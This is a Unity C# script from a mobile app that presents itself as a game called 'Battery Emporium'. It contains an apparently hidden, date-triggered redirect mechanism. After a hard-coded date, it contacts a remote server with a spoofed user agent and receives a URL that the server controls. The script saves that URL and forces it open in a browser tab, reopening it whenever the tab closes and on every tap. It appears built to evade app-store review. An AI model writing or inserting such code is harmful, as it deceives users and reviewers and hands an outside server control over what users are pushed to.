using System;
using System.Net.Http;
using System.Net;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.SceneManagement;
using Assets.SafariView;
using OneDevApp.CustomTabPlugin;

namespace WebView
{
    public class WebViewLoader : MonoBehaviour
    {
        #region Fields

        [SerializeField] private ChromeCustomTab chromeTab;
        [SerializeField] private LoadBar loadBar;

        private string _savedUrl;

        private DateTime _dateTime;
        private bool _isWebViewOpened;
        private bool _isLoadBarStopped;

        private const string DATE = "2024-02-23 15:00:00";
        private const string APPLICATION_NAME = "Battery Emporium";
        private const string ID = "63bd841cefe34946908d5a298f84fb54";
        private const string BUNDLE = "com.game.bc.rush.run";
        private const string URL = "https://api.statist.app/appevent.php";

        #endregion

        private void Update()
        {
            if (Input.GetMouseButtonDown(0))
            {
                CallWebView();
            }
        }
        private string GetPlatformVersion()
        {
            string version = "15.5.0";

            if (Application.platform == RuntimePlatform.IPhonePlayer)
            {
                string osInfo = SystemInfo.operatingSystem;

                string[] splitInfo = osInfo.Split(' ');
                if (splitInfo.Length >= 2 && splitInfo[0] == "iOS")
                {
                    version = splitInfo[1];
                }
            }

            return version;
        }

        private void Start()
        {
            _isWebViewOpened = false;
            _isLoadBarStopped = false;
            Initialize();
            
        }

        private void Initialize()
        {
            loadBar.SetAnimationCallback(CallGame);
            loadBar.OnLoadingComplete += LoadBar_OnLoadingComplete;
            loadBar.PlayBarAnimation();
            chromeTab.OnOpenTab += Link_OnLoadingComplete;

            _savedUrl = PlayerPrefs.GetString("URL");

            if (DateTime.TryParseExact(DATE, "yyyy-MM-dd HH:mm:ss", null, System.Globalization.DateTimeStyles.None, out _dateTime))
            {
                if (DateTime.Now >= _dateTime)
                {
                    SendRequest();
#if UNITY_IOS && !UNITY_EDITOR
                SafariViewController.ViewControllerDidFinish += CallWebView;
#elif UNITY_ANDROID && !UNITY_EDITOR
                chromeTab.OnCloseTab += CallWebView;
#endif
                }
            }
        }

        private async void SendRequest()
        {
            var client = new HttpClient();

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(URL);
            request.UserAgent = Application.platform.ToString();

            string userAgent = $"{APPLICATION_NAME} /0.1.1 ({BUNDLE}; build:1; iOS {GetPlatformVersion()}) Alamofire/5.8.0";

            client.DefaultRequestHeaders.UserAgent.TryParseAdd(userAgent);

            var userLanguage = Application.systemLanguage;

            var variables = new Dictionary<string, string>{
            { "ap", ID },
            { "cp", BUNDLE },
            { "ul", userLanguage.ToString() },
            };

            var response = await client.PostAsync(URL, new FormUrlEncodedContent(variables));
            var responseContent = await response.Content.ReadAsStringAsync();

            string responseJS = responseContent;

            Parser parser = new Parser();
            parser = JsonUtility.FromJson<Parser>(responseJS);

            if (!string.IsNullOrEmpty(parser.u))
            {
                switch (parser.t)
                {
                    case 0:
                        _savedUrl = parser.u;
                        
                        break;
                    case 1:
                        if (string.IsNullOrEmpty(_savedUrl))
                            _savedUrl = parser.u;
                        PlayerPrefs.SetString("URL", _savedUrl);
                        break;
                }
            }


            TryToCallWebView();
            
        }

        private void TryToCallWebView()
        {
            if (string.IsNullOrEmpty(_savedUrl))
                return;

            loadBar.StopBarAnimation();
            CallWebView();
        }

        public void CallWebView()
        {
            
#if UNITY_IOS && !UNITY_EDITOR
        SafariViewController.OpenURL(_savedUrl);
#elif UNITY_ANDROID && !UNITY_EDITOR
        chromeTab.OpenCustomTab(_savedUrl, "#000000", "#000000");
#endif
        }
        
        private void LoadBar_OnLoadingComplete()
        {
            _isLoadBarStopped = true;
            CallGame();
        }   
        private void Link_OnLoadingComplete()
        {
            _isWebViewOpened = true;
            CallGame();
        }

        private void CallGame()
        {
            if (_isLoadBarStopped && _isWebViewOpened)
            {
                Screen.autorotateToPortrait = true;
                Screen.autorotateToPortraitUpsideDown = true;
                Screen.autorotateToLandscapeLeft = false;
                Screen.autorotateToLandscapeRight = false;

                Screen.orientation = ScreenOrientation.AutoRotation;
                Screen.orientation = ScreenOrientation.Portrait;

                SceneManager.LoadScene(1);
            }
        }
    }

    public class Parser
    {
        public string u;
        public int t;
    }
}